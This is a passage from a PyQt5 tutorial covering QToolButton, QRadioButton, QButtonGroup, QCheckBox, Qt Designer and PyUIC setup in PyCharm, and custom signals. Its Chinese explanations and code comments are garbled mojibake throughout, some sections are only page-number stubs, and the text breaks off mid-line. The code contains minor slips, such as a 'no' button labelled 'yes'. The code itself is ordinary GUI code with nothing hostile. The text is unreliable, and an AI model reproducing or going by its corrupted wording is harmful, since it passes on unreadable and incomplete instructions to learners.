‡,å·¥å…·æç¤º\n\n- setText(str) \n- setIcon(QIcon)\n- setIconSize(QSize)\n- setToolTip(str)\n- æ³¨ï¼šå¦‚æœæ–‡æœ¬å’Œå›¾æ ‡åŒæ—¶è®¾ç½®, åˆ™é»˜è®¤åªå±•ç¤ºå›¾æ ‡\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton \")\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"å·¥å…·æŒ‰é’®\")\n\n###########################å½“æœ‰å›¾æ ‡æ˜¾ç¤ºæ—¶å€™ï¼Œæ–‡æœ¬å°±ä¸ä¼šæ˜¾ç¤ºäº†###############################\n#å®ƒå’ŒQPushButton çš„ä¸åŒï¼Œå°±æ˜¯åœ¨äºå®ƒä¸€èˆ¬åªæ˜¾ç¤ºå›¾æ ‡ï¼Œä¸æ˜¾ç¤ºæ–‡æœ¬\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n############################å½“æœ‰å›¾æ ‡æ˜¾ç¤ºæ—¶å€™ï¼Œæ–‡æœ¬å°±ä¸ä¼šæ˜¾ç¤ºäº†###############################\ntool_btn.setToolTip(\"è¿™æ˜¯ä¸€ä¸ªæ–°å»ºæŒ‰é’®\")\n\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### æŒ‰é’®æ ·å¼é£æ ¼\n\n- setToolButtonStyle(Qt.ToolButtonStyle)\n  - Qt.ToolButtonIconOnly  \t\t\t\tä»…æ˜¾ç¤ºå›¾æ ‡  0\n  - Qt.ToolButtonTextOnly               ä»…æ˜¾ç¤ºæ–‡å­—   1\n  - Qt.ToolButtonTextBesideIcon    æ–‡æœ¬æ˜¾ç¤ºåœ¨å›¾æ ‡æ—è¾¹  2\n  - Qt.ToolButtonTextUnderIcon     æ–‡æœ¬æ˜¾ç¤ºåœ¨å›¾æ ‡ä¸‹æ–¹  3\n  - Qt.ToolButtonFollowStyle          éµå¾ªé£æ ¼ 4\n- toolButtonStyle()\n\n```python\ntool_btn.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)\nprint(tool_btn.toolButtonStyle()) # è¾“å‡ºï¼š3\n```\n\n### è®¾ç½®ç®­å¤´\n\n- setArrowType(Qt.ArrowType)\n  - Qt.NoArrow  \t      æ— ç®­å¤´     0\n  - Qt.UpArrow          å‘ä¸Šç®­å¤´   1\n  - Qt.DownArrow     å‘ä¸‹ç®­å¤´   2\n  - Qt.LeftArrow        å‘å·¦ç®­å¤´   3\n  - Qt.RightArrow      å‘å³ç®­å¤´   4\n- arrowType()\n\n```python\ntool_btn.setArrowType(Qt.RightArrow) #æ³¨æ„ï¼Œå¦‚æœç®­å¤´å’Œå›¾æ ‡åŒæ—¶å­˜åœ¨çš„è¯ï¼Œç®­å¤´çš„ä¼˜å…ˆçº§é«˜\nprint(tool_btn.arrowType()) # è¾“å‡ºï¼š4\n```\n\n### è‡ªåŠ¨æå‡\n\n- setAutoRaise(bool)\n- autoRaise()\n- åœ¨è‡ªåŠ¨æå‡æ¨¡å¼ä¸‹ï¼Œè¯¥æŒ‰é’®ä»…åœ¨é¼ æ ‡æŒ‡å‘æ—¶æ‰ä¼šç»˜åˆ¶3Då¸§\n\n```python\ntool_btn = QToolButton(window)\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\ntool_btn.setAutoRaise(True) #å½“é¼ æ ‡æ”¾ä¸Šå»çš„æ—¶å€™ï¼Œä¼šæœ‰è‡ªåŠ¨æå‡çš„æ•ˆæœ\n\nbtn = QPushButton(window)\nbtn.setIcon(QIcon(\"image/jj.ico\"))\nbtn.setIconSize(QSize(20,20))\nbtn.move(100,100)\nbtn.setFlat(True)#å½“é¼ æ ‡æ”¾ä¸Šå»çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šæå‡ä¸Šæ¥ã€‚\n```\n\n### èœå•\n\n- setMenu(QMenu)\n- menu()\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"å·¥å…·æŒ‰é’®\")\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton\")\n\n############################æŒ‰é’®è®¾ç½®èœå•###############################\nmenu = QMenu(tool_btn)\n\nnew_action = QAction(\"æ–°å»º\")\nmenu.addAction(new_action)\nopen_action = QAction(\"æ‰“å¼€\")\nmenu.addAction(open_action)\n\nmenu.addSeparator()\n\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"å­èœå•\")\nrelative_action  = QAction(\"æœ€è¿‘æ‰“å¼€\")\nsub_menu.addAction(relative_action)\nmenu.addMenu(sub_menu)\n\n\ntool_btn.setMenu(menu)\n############################è®¾ç½®èœå•###############################\n\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\nä½†æ˜¯ ï¼Œå´ä¸èƒ½ç‚¹å‡»æ˜¾ç¤ºèœå•æ•ˆæœï¼Œè¿™æ—¶å› ä¸ºæœ‰ä¸ªä¸œè¥¿è¦è®¾ç½®çš„ã€‚è¿™é‡Œæ¶‰åŠåˆ°ä¸‹é¢çš„èœå•å¼¹å‡ºæ¨¡å¼\n\nå®ƒçš„é»˜è®¤å¼¹å‡ºæ¨¡å¼æ˜¯ï¼ŒæŒ‰ä½ä¸€ä¼šæ‰ä¼šå¼¹å‡ºèœå•ã€‚\n\n### èœå•å¼¹å‡ºæ¨¡å¼\n\n- setPopupMode(QToolButton.ToolButtonPopupMode)\n  - QToolButton.DelayedPopup  é¼ æ ‡æŒ‰ä½ä¸€ä¼šæ‰æ˜¾ç¤º ç±»ä¼¼äºæµè§ˆå™¨åé€€æŒ‰é’® 0\n  - QToolButton.MenuButtonPopup  æœ‰ä¸€ä¸ªä¸“é—¨çš„æŒ‡ç¤ºç®­å¤´ ç‚¹å‡»ç®­å¤´æ‰æ˜¾ç¤º  1\n  - QToolButton.InstantPopup  ç‚¹äº†æŒ‰é’®å°±æ˜¾ç¤º ç‚¹å‡»ä¿¡å·ä¸ä¼šå‘å°„  2\n- popupMode()\n\n```python\ntool_btn.setPopupMode(QToolButton.InstantPopup)\nprint(tool_btn.popupMode()) #è¾“å‡ºï¼š2\n```\n\n### ä¿¡å·\n\n- triggered(QAction *action)  å½“ç‚¹å‡»æŸä¸ªactionæ—¶è§¦å‘, å¹¶ä¼šå°†actionä¼ é€’å‡ºæ¥\n\n- QActionå¯¹è±¡å¯ä»¥é€šè¿‡ setData(Any)  ç»‘å®šæ•°æ®  data() è·å–æ•°æ®\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"å·¥å…·æŒ‰é’®\")\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton\")\n\n############################æŒ‰é’®è®¾ç½®èœå•###############################\nmenu = QMenu(tool_btn)\n\nnew_action = QAction(\"æ–°å»º\")\nmenu.addAction(new_action)\nnew_action.setData(\"new\")  #ç»‘å®šæ•°æ®\n\nopen_action = QAction(\"æ‰“å¼€\")\nmenu.addAction(open_action)\nopen_action.setData(\"open\") #ç»‘å®šæ•°æ®\n\nmenu.addSeparator()\n\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"å­èœå•\")\nrelative_action  = QAction(\"æœ€è¿‘æ‰“å¼€\")\nsub_menu.addAction(relative_action)\nmenu.addMenu(sub_menu)\n\ntool_btn.setMenu(menu)\ntool_btn.setPopupMode(QToolButton.InstantPopup)\n############################è®¾ç½®èœå•###############################\n\ndef tool_btn_triggered_slot(action):\n    if action.data()  == \"new\":\n        print(\"ä½ ç‚¹å‡»çš„æ˜¯æ–°å»º\",action)\n    elif action.data() == \"open\":\n        print(\"ä½ ç‚¹å‡»çš„æ˜¯æ‰“å¼€\",action)\n        \ntool_btn.triggered.connect(tool_btn_triggered_slot)\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n## QRadioButton\n\n> ä¸€èˆ¬ç”¨äºç»™ç”¨æˆ·æä¾›è‹¥å¹²é€‰é¡¹ä¸­çš„å•é€‰æ“ä½œ\n>\n> QAbstractButton çš„å­ç±»\n\n### åˆ›å»º\n\n- QRadioButton(parent)\n- QRadioButton(text, parent)\n\n```python\nradio_button_1 = QRadioButton(\"ç”·\",window)\nradio_button_1.move(100,100)\nradio_button_1.setIcon(QIcon(\"icon.ico\"))\nradio_button_1.setChecked(True)  # å®ƒæ˜¯é»˜è®¤é€‰ä¸­\n\nradio_button_2 = QRadioButton(\"å¥³\",window)\nradio_button_2.move(100,200)\nradio_button_2.setIcon(QIcon(\"icon.ico\"))\n```\n\n### ä¿¡å·\n\n- toggled(bool)\n\n```python\nradio_button_2.toggled.connect(lambda :print(\"çŠ¶æ€åˆ‡æ¢\"))\n```\n\n## QButtonGroup\n\n> æä¾› ä¸€ä¸ªæŠ½è±¡çš„æŒ‰é’®å®¹å™¨, å¯ä»¥å°†å¤šä¸ªæŒ‰é’®åˆ’åˆ†ä¸ºä¸€ç»„\n>\n> QObject çš„å­ç±»\n\n### åˆ›å»º\n\n- QButtonGroup(parent)\n\n### æ·»åŠ æŒ‰é’®\n\n- addButton(QAbstractButton, id = -1)\n- å¦‚æœidä¸º-1ï¼Œåˆ™å°†ä¸ºè¯¥æŒ‰é’®åˆ†é…ä¸€ä¸ªidã€‚è‡ªåŠ¨åˆ†é…çš„IDä¿è¯ä¸ºè´Ÿæ•°ï¼Œä»-2å¼€å§‹ã€‚\n- å¦‚æœè¦åˆ†é…è‡ªå·±çš„IDï¼Œè¯·ä½¿ç”¨æ­£å€¼ä»¥é¿å…å†²çª\n\n### æŸ¥çœ‹æŒ‰é’®\n\n- buttons()  æŸ¥çœ‹æ‰€æœ‰æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®\n- button(ID)  æ ¹æ®IDè·å–å¯¹åº”æŒ‰é’®, æ²¡æœ‰åˆ™è¿”å›None\n- checkedButton()  è·å–é€‰ä¸­çš„é‚£ä¸ªæŒ‰é’®\n\n### ç§»é™¤æŒ‰é’®\n\n- removeButton(QAbstractButton)\n- å®ƒå¹¶ä¸æ˜¯ä»ç•Œé¢ä¸Šåˆ é™¤è¿™ä¸ªæŒ‰é’®ï¼Œè€Œåªæ˜¯å°†å…¶ç§»å‡ºæŠ½è±¡çš„æŒ‰é’®ç»„ã€‚\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n#1,åˆ›å»ºapp\napp  = QApplication(sys.argv)\n\n\n#2ï¼Œæ§ä»¶çš„æ“ä½œï¼š\n#åˆ›å»ºæ§ä»¶\nwindow = QWidget()\n\nradio_button_1 = QRadioButton(\"ç”·-Male\",window)\nradio_button_1.move(100,100)\nradio_button_2 = QRadioButton(\"å¥³-Famale\",window)\nradio_button_2.move(100,200)\n\nradio_button_yes = QRadioButton(\"yes\",window)\nradio_button_yes.move(300,100)\nradio_button_no = QRadioButton(\"yes\",window)\nradio_button_no.move(300,200)\n\n#è®¾ç½®æ§ä»¶\nwindow.setWindowTitle(\"QRadioButton\")\nwindow.resize(500,500)\n\n###########################################################\nsex_group = QButtonGroup(window)\nsex_group.addButton(radio_button_1)\nsex_group.addButton(radio_button_2)\n###########################################################\n\n###########################################################\njudge_group = QButtonGroup(window)\njudge_group.addButton(radio_button_yes,1) # è®¾ç½®id=1\njudge_group.addButton(radio_button_no,2)  # è®¾ç½®id=2\n###########################################################\n\nprint(sex_group.buttons())\nprint(judge_group.button(1))\nprint(judge_group.checkedButton())\nsex_group.removeButton(radio_button_2)\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#3,è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### ç»‘å®šå’Œè·å–ID\n\n- setId(QAbstractButtonï¼Œint)\n- id(QAbstractButton)  æŒ‡å®šæŒ‰é’®å¯¹åº”çš„IDï¼Œå¦‚æœä¸å­˜åœ¨æ­¤æŒ‰é’®ï¼Œåˆ™è¿”å›-1\n- checkedId()  è·å–é€‰ä¸­çš„IDï¼Œå¦‚æœæ²¡æœ‰é€‰ä¸­æŒ‰é’®åˆ™è¿”å›-1\n\n```python\n#****************************ç»‘å®šid *******************************\nsex_group.setId(radio_button_1,1)\nsex_group.setId(radio_button_2,2)\n#****************************ç»‘å®šid *******************************\n\n#****************************è·å–id *******************************\nprint(sex_group.id(radio_button_1))\nprint(sex_group.id(radio_button_2))\n#****************************è·å–id *******************************\n\n#****************************æŸ¥çœ‹å½“å‰é€‰ä¸­çš„æŒ‰é’®çš„id*******************\nprint(sex_group.checkedId())\n#****************************æŸ¥çœ‹å½“å‰é€‰ä¸­çš„æŒ‰é’®çš„id*******************\n```\n\n### ç‹¬å è®¾ç½®\n\n- setExclusive(bool)\n\n- exclusive()\n- åº”ç”¨åœºæ™¯ï¼šç»Ÿä¸€è®¾ç½®æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®æ˜¯å¦æ˜¯ç‹¬å (é€‰æ‹©äº’æ–¥)\n\n```python\n#****************************å°†ä¸€ä¸ªç»„çš„ç‹¬å è®¾ç½®ä¸ºå¦å®š*******************************\nsex_group.setExclusive(False)\n#****************************å°†ä¸€ä¸ªç»„çš„ç‹¬å è®¾ç½®ä¸ºå¦å®š*******************************\n```\n\n### ä¿¡å·\n\n- buttonClicked(int/QAbstractButton)  å½“æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®è¢«ç‚¹å‡»æ—¶, å‘å°„æ­¤ä¿¡å·\n- buttonPressed(int/QAbstractButton)  å½“æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®è¢«æŒ‰ä¸‹æ—¶, å‘å°„æ­¤ä¿¡å·\n- buttonReleased(int/QAbstractButton)  å½“æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®è¢«é‡Šæ”¾æ—¶, å‘å°„æ­¤ä¿¡å·\n- buttonToggled(QAbstractButton/int, bool)  å½“æŒ‰é’®ç»„ä¸­çš„æŒ‰é’®è¢«åˆ‡æ¢çŠ¶æ€æ—¶, å‘å°„æ­¤ä¿¡å·\n\n- QButtonGroup ä¿¡å·ä¼šä¼ é€’ä¸¤ç§ç±»å‹çš„å€¼ï¼Œä¸€ä¸ªæ˜¯å…·ä½“å“ªä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªæ˜¯å®ƒçš„ idã€‚å‘å‡ºä¿¡å·æ—¶å‘å¤–ä¼ å‡ºçš„int æŒ‡çš„æ˜¯ä¹‹å‰è®¾ç½®çš„ id ã€‚\n\n### ä¿¡å·ä¼ å‡ºå¤šä¸ªå‚æ•°\n\n- å¦‚æœä¿¡å·åç§°ä¸€æ ·ï¼Œä½†å‚æ•°ä¸ä¸€æ ·ï¼Œå¤–ç•Œåœ¨ä½¿ç”¨ä¿¡å·æ—¶, å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ¼å¼è¿›è¡Œé€‰æ‹©\n- signal_name[type]  ä¿¡å·åç§°[å‚æ•°ç±»å‹]\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n#1,åˆ›å»ºapp\napp  = QApplication(sys.argv)\n\n\n#2ï¼Œæ§ä»¶çš„æ“ä½œï¼š\n#åˆ›å»ºæ§ä»¶\nwindow = QWidget()\n\nradio_button_1 = QRadioButton(\"ç”·-Male\",window)\nradio_button_1.move(100,100)\nradio_button_2 = QRadioButton(\"å¥³-Famale\",window)\nradio_button_2.move(100,200)\n\nradio_button_yes = QRadioButton(\"yes\",window)\nradio_button_yes.move(300,100)\nradio_button_no = QRadioButton(\"yes\",window)\nradio_button_no.move(300,200)\n\n#è®¾ç½®æ§ä»¶\nwindow.setWindowTitle(\"QRadioButton\")\nwindow.resize(500,500)\n\n\n###########################################################\nsex_group = QButtonGroup(window)\nsex_group.addButton(radio_button_1)\nsex_group.addButton(radio_button_2)\n###########################################################\n\n\n###########################################################\njudge_group = QButtonGroup(window)\njudge_group.addButton(radio_button_yes,1) # è®¾ç½®id=1\njudge_group.addButton(radio_button_no,2)  # è®¾ç½®id=2\n###########################################################\n\n#****************************ç»‘å®šid *******************************\nsex_group.setId(radio_button_1,1)\nsex_group.setId(radio_button_2,2)\n#****************************ç»‘å®šid *******************************\n\n\nsex_group.buttonClicked.connect(lambda val:print(val)) #å‘å¤–ä¼ å‡ºçš„æ˜¯å…·ä½“çš„æŒ‰é’®\nsex_group.buttonClicked[int].connect(lambda val:print(val)) #å‘å¤–ä¼ å‡ºçš„æ˜¯æŒ‰é’®çš„id\n\nsex_group.buttonClicked.connect(lambda val:print(val,sex_group.id(val))) # å½“ç„¶è·å–äº†å…·ä½“çš„æŒ‰é’®ä¹‹åï¼Œè‡ªç„¶å¾ˆç®€å•å°±å¯ä»¥è·å¾—å®ƒçš„id\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n\n#3,è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n## QCheckBox\n\n> ä¸€èˆ¬ç”¨äºç»™ç”¨æˆ·æä¾›è‹¥å¹²é€‰é¡¹ä¸­çš„å¤šé€‰æ“ä½œ\n>\n> QAbstractButton çš„å­ç±»\n\n### åˆ›å»º\n\n- QCheckBox(parent)\n- QCheckBox(text, parent)\n\n```python\ncheckbox1 = QCheckBox(window)\ncheckbox1.setText(\"Python\")\ncheckbox1.move(50,30)\n\ncheckbox2 = QCheckBox(window)\ncheckbox2.setText(\"C++\")\ncheckbox2.move(50,60)\n\ncheckbox3 = QCheckBox(window)\ncheckbox3.setText(\"C\")\ncheckbox3.move(50,90)\n```\n\n### è®¾ç½®æ˜¯å¦ä¸‰æ€\n\n- setTristate(bool=True)\n- isTristate()\n- å®ƒé»˜è®¤æ˜¯å±•ç¤ºä¸¤ç§çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®æ¥å±•ç¤ºä¸‰ç§çŠ¶æ€ï¼ˆé€‰ä¸­ã€åŠé€‰ä¸­ã€æ²¡é€‰ä¸­ï¼‰ã€‚\n\n```python\ncheckbox1.setTristate(True)\nprint(checkbox1.isTristate())\n```\n\n### è®¾ç½®å¤é€‰æ¡†çŠ¶æ€\n\n- setCheckState(Qt.CheckState)\n  - Qt.Unchecked  è¯¥é¡¹ç›®æœªé€‰ä¸­ 0\n  - Qt.PartiallyChecked  éƒ¨åˆ†é€‰ä¸­ 1\n  - Qt.Checked  çœŸçš„è¢«é€‰ä¸­ 2\n\n- checkState()\n\n```python\ncheckbox2.setCheckState(Qt.PartiallyChecked)  # åŠé€‰ä¸­çŠ¶æ€\n# checkbox2.setCheckState(Qt.Checked)  #é€‰ä¸­\n# checkbox2.setCheckState(Qt.Unchecked) #æœªé€‰ä¸­\n```\n\n### ä¿¡å·\n\n- stateChanged(int state)  é€‰ä¸­æˆ–æ¸…é™¤é€‰ä¸­æ—¶, å‘å°„æ­¤ä¿¡å·\n- å…¶ä»–ä¿¡å·ç»§æ‰¿çˆ¶ç±»\n\nå®ƒä¹‹æ‰€ä»¥å¤šäº†ä¸ªä¿¡å·ï¼Œæ˜¯å› ä¸ºå®ƒæœ‰çš„æ—¶å€™æ˜¯ä¸‰æ€ï¼Œæ‰€ä»¥ä¹‹å‰çš„toggled å°±ä¸æ”¯æŒä¸‰æ€äº†ã€‚\n\n```python\ncheckbox1.setTristate(True)\ncheckbox1.stateChanged.connect(lambda state:print(state)) # 0ï¼Œ1,2\n\ncheckbox3.toggled.connect(lambda bool:print(bool)) # Trueï¼ŒFalse\n```\n\n\n\n## QLineEdit\n\n67-91\n\n\n\n79-85 ï¼Ÿï¼Ÿï¼Ÿ\n\n## QFrame\n\n92-93\n\n## QAbstractScrollArea\n\n94\n\n## QTextEdit\n\n95-130\n\n## QPlainTextEdit\n\n131-140\n\n## QKeySequenceEdit\n\n141-143\n\n## QAbstractSpinBox\n\n144-151\n\n## QSpinBox\n\n152-160\n\n\n\n# å¸ƒå±€ç®¡ç†å™¨\n\n261-295\n\n# QSS\n\n296-327\n\n\n\n\n\n# QTDesigner\n\n> Qt Designer é€šè¿‡æ‹–æ‹½çš„æ–¹å¼æ”¾ç½®æ§ä»¶å¯ä»¥éšæ—¶æŸ¥çœ‹æ§ä»¶æ•ˆæœï¼Œè®¾è®¡ç¬¦åˆMVCçš„æ¶æ„ï¼Œå®ç°äº†è§†å›¾å’Œé€»è¾‘çš„åˆ†ç¦»ï¼Œä»è€Œå®ç°äº†å¼€å‘çš„ä¾¿æ·\n\n## é…ç½®QTDesigner\n\n> ä¸ºäº†ä¸æ¯æ¬¡éƒ½åœ¨å¤–éƒ¨æ‰“å¼€ QTDesignerï¼Œå¯ä»¥åœ¨ PyCharm ä¸­é…ç½®å¿«æ·æŒ‰é’®ï¼Œåªéœ€ç‚¹å‡»å³å¯æ‰“å¼€QTDesigner\n\næ“ä½œæ­¥éª¤ï¼šç‚¹å‡»è®¾ç½®-->å·¥å…·-->å¤–éƒ¨å·¥å…·-->ç‚¹å‡»â€œ+â€-->è¿›è¡Œå¦‚ä¸‹é…ç½®\n\n![](https://img.jwt1399.top//img/20210811165725.png)\n\n```python\nNameï¼šQTDesigner\nProgramï¼šD:\\Qt\\Qt5.14.2\\5.14.2\\mingw73_32\\bin\\designer.exe   # QTDesignerçš„ä½ç½®\nWorking directoryï¼š$ProjectFileDir$ #å½“å‰é¡¹ç›®æ–‡ä»¶ç›®å½•\n```\n\né…ç½®å®Œæˆåï¼Œåœ¨ Pycharm çš„èœå•æ  Tools æˆ–è€…å³å‡»â€”â€”>External Toolsâ€”â€”>QTDesignerï¼Œå¯ä»¥çœ‹åˆ°åˆšæ‰é…ç½®èœå• QTDesignerï¼Œç‚¹å‡»å³å¯æ‰“å¼€ QTDesigner\n\n## åŠ è½½UIæ–‡ä»¶\n\n### åŠ¨æ€åŠ è½½UIæ–‡ä»¶\n\n```python\nfrom PyQt5.QtWidgets import QApplication\nfrom PyQt5 import uic\nimport sys\n\n# ä»æ–‡ä»¶ä¸­åŠ è½½UIå®šä¹‰\napp = QApplication(sys.argv)\nui = uic.loadUi(\"test.ui\")\nui.show()\nsys.exit(app.exec_())\n```\n\n### è½¬UIæ–‡ä»¶ä¸ºPyæ–‡ä»¶è¿›è¡ŒåŠ è½½\n\n1.æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤æŠŠ UI æ–‡ä»¶ç›´æ¥è½¬åŒ–ä¸ºåŒ…å«ç•Œé¢å®šä¹‰çš„Pyæ–‡ä»¶\n\n```shell\npython -m PyQt5.uic.pyuic test.ui -o test.py -x\n\n# -o è¾“å‡ºæ–‡ä»¶\n# -x ç”Ÿæˆif __name__ == \"__main__\":æµ‹è¯•ä»£ç \n```\n\n2.ç„¶ååœ¨ä½ çš„ä»£ç æ–‡ä»¶ä¸­è¿™æ ·ä½¿ç”¨å®šä¹‰ç•Œé¢çš„ç±»\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\nimport test  # uiæ–‡ä»¶è½¬ä¸ºpyæ–‡ä»¶çš„æ–‡ä»¶å\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nui = test.Ui_MainWindow()  # pyæ–‡ä»¶çš„ç±»å\nui.setupUi(window)\nwindow.show()\nsys.exit(app.exec_())\n```\n\n\n## é…ç½®PyUIC\n\n> ä¸ºäº†ä¸æ¯æ¬¡éƒ½æ‰§è¡Œ ui è½¬ py ä»£ç ï¼Œå¯ä»¥åœ¨ PyCharm ä¸­é…ç½®å¿«æ·æŒ‰é’®ï¼Œåªéœ€ç‚¹å‡»å³å¯è¿›è¡Œ ui æ–‡ä»¶åˆ° py æ–‡ä»¶çš„è½¬åŒ–ã€‚\n\næ“ä½œæ­¥éª¤ï¼šç‚¹å‡»è®¾ç½®-->å·¥å…·-->å¤–éƒ¨å·¥å…·-->ç‚¹å‡»â€œ+â€-->è¿›è¡Œå¦‚ä¸‹é…ç½®\n![](https://img.jwt1399.top//img/20210713195925.png)\n\n```python\nNameï¼šPyUIC\nProgramï¼šD:\\Python37\\python.exe   #pythonå®‰è£…è·¯å¾„ï¼Œè¦ç¡®ä¿å·²ç»å®‰è£…PyQt5\nArgumentsï¼š-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$_ui.py -x #æŠŠuiæ–‡ä»¶è½¬æˆåŒåpyæ–‡ä»¶\nWorking directoryï¼š$FileDir$ #å½“å‰æ–‡ä»¶ç›®å½•\n```\n\né…ç½®å®Œæˆåï¼Œåœ¨ Pycharm çš„èœå•æ  Tools æˆ–è€…å³å‡»éœ€è¦è½¬æ¢çš„uiæ–‡ä»¶â€”â€”>External Toolsâ€”â€”>PyUICï¼Œç‚¹å‡» PyUIC å³å¯è¿›è¡Œè½¬æ¢\n\n## é…ç½®PyQrc\n\n> å¯ä»¥åœ¨ PyCharm ä¸­é…ç½®å¿«æ·æŒ‰é’®ï¼Œåªéœ€ç‚¹å‡»å³å¯è¿›è¡Œ qrc æ–‡ä»¶åˆ° py æ–‡ä»¶çš„è½¬åŒ–ã€‚\n\næ“ä½œæ­¥éª¤ï¼šç‚¹å‡»è®¾ç½®-->å·¥å…·-->å¤–éƒ¨å·¥å…·-->ç‚¹å‡»â€œ+â€-->è¿›è¡Œå¦‚ä¸‹é…ç½®\n![](https://img.jwt1399.top//img/20210811171857.png)\n\n```python\nNameï¼šPyQrc\nProgramï¼šD:\\Python37\\Scripts\\pyrcc5.exe   #pyrcc5è·¯å¾„ï¼Œè¦ç¡®ä¿å·²ç»å®‰è£…PyQt5\nArgumentsï¼š$FileName$ -o $FileNameWithoutExtension$_rc.py #æŠŠqrcæ–‡ä»¶è½¬æˆåŒåpyæ–‡ä»¶\nWorking directoryï¼š$FileDir$ #å½“å‰æ–‡ä»¶ç›®å½•\n```\n\né…ç½®å®Œæˆåï¼Œåœ¨ Pycharm çš„èœå•æ  Tools æˆ–è€…å³å‡»éœ€è¦è½¬æ¢çš„qrcæ–‡ä»¶â€”â€”>External Toolsâ€”â€”>PyQrcï¼Œç‚¹å‡» PyQrc å³å¯è¿›è¡Œè½¬æ¢\n\n\n\n# è‡ªå®šä¹‰ä¿¡å·\n\n> å¦‚æœç³»ç»Ÿæä¾›çš„ä¿¡å·ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬è‡ªå®šä¹‰ä¿¡å·\n>\n> ä¾‹å¦‚é¼ æ ‡å•å‡»å¾€å¾€æŒ‡çš„æ˜¯å·¦å‡»ï¼Œè€Œä¸æ˜¯å³å‡»ï¼Œå¦‚æœæƒ³è¦æ‹¥æœ‰å³å‡»ä¿¡å·ï¼Œå°±éœ€è¦è‡ªå·±è‡ªå®šä¹‰ä¿¡å·äº†ï¼\n\n## ä¿¡å·çš„å®šä¹‰\n\nåœ¨ç±»çš„å†…éƒ¨, ä»¥ç±»å±æ€§çš„å½¢å¼å®šä¹‰\n\n- pyqtSignal(ç±»å‹1, ç±»å‹2...)\n- é‡è½½ç‰ˆæœ¬  pyqtSignal([int],[str]) \n\n```python\nclass Btn(QPushButton):\n    doubleClick = pyqtSignal()\n    doubleClick2 = pyqtSignal([int], [str])\n```\n\nQTDeasignerä¸­ä½¿ç”¨è‡ªå®šä¹‰ä¿¡å·è¦å°†æ§ä»¶æå‡ä¸ºè‡ªå®šä¹‰çš„ç±»(Btn)\n\n## ä¿¡å·çš„å‘å°„\n\n- ä¿¡å·.emit(å‚æ•°1, å‚æ•°2...)\n- æ³¨æ„ é‡è½½çš„ä¿¡å·é€‰æ‹©é—®é¢˜  ä¿¡å·[ç±»å‹]\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Btn(QPushButton):\n    right_clicked = pyqtSignal([str],[int],[int,str])  #ä¸­æ‹¬å·çš„æ„æ€æ˜¯é‡è½½\n\n    def mousePressEvent(self,event):\n        super().mousePressEvent(event)\n        if event.button() == Qt.RightButton:  #å³å‡»æ—¶å‘å°„ä¿¡å·\n            self.right_clicked.emit(self.text())   #å‘å°„å‚æ•°æ˜¯strçš„ä¿¡å·\n            self.right_clicked[int,str].emit(100,self.text())   #å‘å°„å‚æ•°æ˜¯strå’Œintçš„ä¿¡å·\n            self.right_clicked[int].emit(100)   